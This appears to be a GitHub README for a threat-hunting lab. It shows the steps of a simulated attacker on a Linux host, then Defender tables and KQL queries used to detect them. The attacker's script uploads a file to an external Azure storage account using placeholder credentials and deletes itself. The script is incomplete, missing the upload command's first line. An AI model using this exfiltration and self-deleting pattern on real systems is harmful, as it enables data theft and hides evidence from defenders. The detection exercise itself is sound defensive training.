<h1 align="center">SCENARIO: ESCALATION OF PRIVILEGES & DATA EXFILTRATION</h1>

<p align="center">
  <img width="500" src="https://github.com/user-attachments/assets/a0adf9a5-0da7-4f59-a5d6-6615358b3f41" alt="Linux" />
</p>

## STEPS THE "BAD ACTOR" TOOK TO CREATE LOGS AND IOCs

### Step 1: **Switch to the Root User's Home Directory** 
```bash
cd
```

---

### Step 2: **Create and Prepare the Script File** 
```bash
touch super_secret_script.sh
chmod +x super_secret_script.sh
nano super_secret_script.sh
```

---

### Step 3: **Write the Malicious Script** 
```bash
#!/bin/bash

  --account-name $ACCOUNT_NAME \
  --account-key $ACCESS_KEY \
  --container-name $CONTAINER_NAME \
  --file $FILE_NAME \
  --name $BLOB_NAME

rm -- "$0"
```

---

### Step 4: **Execute the Script** 
```bash
./super_secret_script.sh
```

---


## TABLES USED TO DETECT IOCS
| **Parameter**       | **Description**                                                                                                                |
|---------------------|--------------------------------------------------------------------------------------------------------------------------------|
| **Table**           | `DeviceFileEvents`                                                                                                             |
| **Info**            | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table                                               |
| **Purpose**         | To find privilege escalation attempts linked to file changes or creation of backdoor scripts. |

| **Parameter**       | **Description**                                                                              |
|---------------------|----------------------------------------------------------------------------------------------|
| **Table**           | `DeviceProcessEvents`                                                                        |
| **Info**            | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table             |
| **Purpose**         | To detect execution of malicious scripts or binaries on the system. |
 
| **Parameter**       | **Description**                                                                                                                                    |
|---------------------|----------------------------------------------------------------------------------------------------------------------------------------------------|
| **Name**            | `DeviceNetworkEvents`                                                                                                                              |
| **Info**            | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table                                                          |
| **Purpose**         | To validate data exfiltration by identifying outbound connections to suspicious or external endpoints. |

---

## QUERIES USED
```kql
DeviceFileEvents
| where DeviceName contains "willis-linux-mde"
| where ActionType == "FileCreated"
| order by Timestamp desc
```

```kql
DeviceFileEvents
| where DeviceName contains "willis-linux-mde"
| where ActionType == "FileCreated"
| where FileName contains "secret"
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, InitiatingProcessCommandLine
```

```kql
DeviceFileEvents
| where DeviceName contains "willis-linux-mde"
| where ActionType == "FileCreated"
| project Timestamp, DeviceName, FileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
```

```kql
DeviceProcessEvents
| where Timestamp >= datetime(2025-07-08T20:55:51.372756Z)
| where DeviceName contains "willis-linux-mde"
| project Timestamp, DeviceName, ActionType, InitiatingProcessCommandLine
| order by Timestamp asc
```

```kql
DeviceNetworkEvents
| where Timestamp >= datetime(2025-07-08T20:55:51.372756Z)
| where DeviceName contains "willis-linux-mde"
| project Timestamp, ActionType, InitiatingProcessCommandLine
| order by Timestamp asc
```

---

## CREATED BY
**Author**: `Briana Willis`<br>
**Contact**: [`https://www.linkedin.com/in/brianalwillis/`](https://www.linkedin.com/in/brianalwillis/)<br>
**Date**: `2025-07-09`

## VALIDATED BY
**Reviewer Name**:<br> 
**Reviewer Contact**:<br> 
**Validation Date**: 

---

## REVISION HISTORY
| **Version** | **Date**     | **Modified By**|
|-------------|--------------|----------------|
| 1.0         | `2025-07-09` | `Briana Willis`   

